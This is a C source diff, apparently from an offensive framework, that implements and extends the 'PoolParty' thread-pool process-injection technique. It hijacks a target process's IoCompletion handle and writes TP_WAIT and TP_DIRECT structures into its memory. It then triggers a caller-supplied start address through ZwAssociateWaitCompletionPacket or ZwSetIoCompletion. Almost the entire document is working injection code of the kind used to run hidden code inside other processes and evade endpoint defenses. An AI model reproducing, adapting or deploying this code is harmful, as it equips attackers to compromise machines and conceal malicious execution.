@@ -1,11 +1,18 @@
+#include "common.h"
 #include "pool_party.h"
 #include "pool_party_ext.h"
 
-pNtDll* pNtDll_Init() {
+pNtDll *ntdll = NULL;
+
+pNtDll* GetOrInitNtDll() {
 	BOOL bError = FALSE;
 	HANDLE hHeap = GetProcessHeap();
-	pNtDll* ntdll = NULL;
 	bError = (hHeap == NULL);
+
+	if (ntdll != NULL) {
+		return ntdll;
+	}
+
 	if (!bError) {
 		ntdll = (pNtDll*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(pNtDll));
 		bError = ntdll == NULL;
@@ -54,21 +61,15 @@ pNtDll* pNtDll_Init() {
 	return ntdll;
 }
 
-
-DWORD remote_tp_wait_insertion(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE *hTriggerHandle) {
-	BOOL bError = FALSE;
+HANDLE GetIoCompletionHandle(HANDLE hProcess) {
 	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
 	ULONG dwInformationSizeIn = 1;
 	ULONG dwInformationSizeOut = 0;
+	HANDLE hCurrProcess = GetCurrentProcess();
+	HANDLE hHeap = GetProcessHeap();
 	PPROCESS_HANDLE_SNAPSHOT_INFORMATION lpProcessInfo = NULL;
 	PPUBLIC_OBJECT_TYPE_INFORMATION lpObjectInfo = NULL;
-	BOOL bFound = FALSE;
-
-	pNtDll* ntdll = pNtDll_Init();
-	if (ntdll == NULL) return 0;
-
-	HANDLE hHeap = GetProcessHeap();
-	HANDLE hCurrProcess = GetCurrentProcess();
+	pNtDll* ntDll = GetOrInitNtDll();
 
 	lpProcessInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
 	while (ntdll->pNtQueryInformationProcess(hProcess, ProcessHandleInformation, lpProcessInfo, dwInformationSizeIn, &dwInformationSizeOut) == 0xC0000004L) {
@@ -82,28 +83,84 @@ DWORD remote_tp_wait_insertion(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lp
 	lpObjectInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
 	for (ULONG i = 0; i < lpProcessInfo->NumberOfHandles; i++) {
 		DuplicateHandle(hProcess, lpProcessInfo->Handles[i].HandleValue, hCurrProcess, &hHijackHandle, IO_COMPLETION_ALL_ACCESS, FALSE, 0);
-		ntdll->pNtQueryObject(hHijackHandle, ObjectTypeInformation, lpObjectInfo, dwInformationSizeIn, &dwInformationSizeOut);
+		ntDll->pNtQueryObject(hHijackHandle, ObjectTypeInformation, lpObjectInfo, dwInformationSizeIn, &dwInformationSizeOut);
 		if (dwInformationSizeIn > dwInformationSizeOut) {
 			if (lstrcmpW(L"IoCompletion", lpObjectInfo->TypeName.Buffer) == 0) {
-				bFound = TRUE;
 				break;
 			}
 		}
 		hHijackHandle = INVALID_HANDLE_VALUE;
 	}
-	PFULL_TP_WAIT hThreadPool = (PFULL_TP_WAIT)CreateThreadpoolWait((PTP_WAIT_CALLBACK)(lpStartAddress), lpParameter, NULL);
-	PFULL_TP_WAIT pRemoteTpWait = VirtualAllocEx(hProcess, NULL, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	WriteProcessMemory(hProcess, pRemoteTpWait, hThreadPool, sizeof(FULL_TP_WAIT), NULL);
-
-	PTP_DIRECT pRemoteTpDirect = VirtualAllocEx(hProcess, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	WriteProcessMemory(hProcess, pRemoteTpDirect, &hThreadPool->Direct, sizeof(TP_DIRECT), NULL);
-	HANDLE hEvent = CreateEventA(NULL, FALSE, FALSE, "TO_MAKE_RANDOM"); // TODO: Make it random
-	ntdll->pZwAssociateWaitCompletionPacket(hThreadPool->WaitPkt, hHijackHandle, hEvent, pRemoteTpDirect, pRemoteTpWait, 0, 0, NULL);
-	
-	*hTriggerHandle = hEvent;
-
 	HeapFree(hHeap, 0, lpObjectInfo);
 	HeapFree(hHeap, 0, lpProcessInfo);
-	HeapFree(hHeap, 0, ntdll);
-	return 0;
+	return hHijackHandle;
+}
+
+DWORD remote_tp_wait_insertion(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE *hTriggerHandle) {
+	BOOL bError = FALSE;
+	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
+	ULONG dwInformationSizeIn = 1;
+	ULONG dwInformationSizeOut = 0;
+	pNtDll* ntDll = NULL;
+	DWORD dwResult = 1;
+	HANDLE hHeap = GetProcessHeap();
+
+	do {
+		ntDll = GetOrInitNtDll();
+		if (ntdll == NULL) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] Cannot init GetOrInitNtDll()", ERROR_POOLPARTY_GENERIC);
+		}
+
+		hHijackHandle = GetIoCompletionHandle(hProcess);
+
+		if (hHijackHandle == INVALID_HANDLE_VALUE) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] Unable to locate IoCompletion object inside the target process.", ERROR_POOLPARTY_VARIANT_FAILED)
+		}
+
+		if (hHijackHandle != INVALID_HANDLE_VALUE) {
+			PFULL_TP_WAIT hThreadPool = (PFULL_TP_WAIT)CreateThreadpoolWait((PTP_WAIT_CALLBACK)(lpStartAddress), lpParameter, NULL);
+			PFULL_TP_WAIT pRemoteTpWait = VirtualAllocEx(hProcess, NULL, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+			WriteProcessMemory(hProcess, pRemoteTpWait, hThreadPool, sizeof(FULL_TP_WAIT), NULL);
+
+			PTP_DIRECT pRemoteTpDirect = VirtualAllocEx(hProcess, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+			WriteProcessMemory(hProcess, pRemoteTpDirect, &hThreadPool->Direct, sizeof(TP_DIRECT), NULL);
+			ntDll->pZwAssociateWaitCompletionPacket(hThreadPool->WaitPkt, hHijackHandle, *hTriggerHandle, pRemoteTpDirect, pRemoteTpWait, 0, 0, NULL);
+		}
+
+		dwResult = 0;
+	} while (0);
+	return dwResult;
+}
+
+DWORD remote_tp_direct_insertion(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTrigger) {
+	BOOL bError = FALSE;
+	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
+	ULONG dwInformationSizeIn = 1;
+	ULONG dwInformationSizeOut = 0;
+	pNtDll* ntDll = NULL;
+	DWORD dwResult = 1;
+	HANDLE hHeap = GetProcessHeap();
+	TP_DIRECT Direct = { 0 };
+	do {
+		ntDll = GetOrInitNtDll();
+		if (ntdll == NULL) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Cannot GetOrInitNtDll()", ERROR_POOLPARTY_GENERIC);
+		}
+
+		hHijackHandle = GetIoCompletionHandle(hProcess);
+
+		if (hHijackHandle == INVALID_HANDLE_VALUE) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to locate IoCompletion object inside the target process.", ERROR_POOLPARTY_VARIANT_FAILED)
+		}
+
+		if (hHijackHandle != INVALID_HANDLE_VALUE) {
+			Direct.Callback = lpStartAddress;
+			LPVOID RemoteDirectAddress = VirtualAllocEx(hProcess, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+			WriteProcessMemory(hProcess, RemoteDirectAddress, &Direct, sizeof(TP_DIRECT), NULL);
+			ntDll->pZwSetIoCompletion(hHijackHandle, RemoteDirectAddress, lpParameter, 0, 0);
+		}
+
+		dwResult = 0;
+	} while (0);
+	return dwResult;
 }
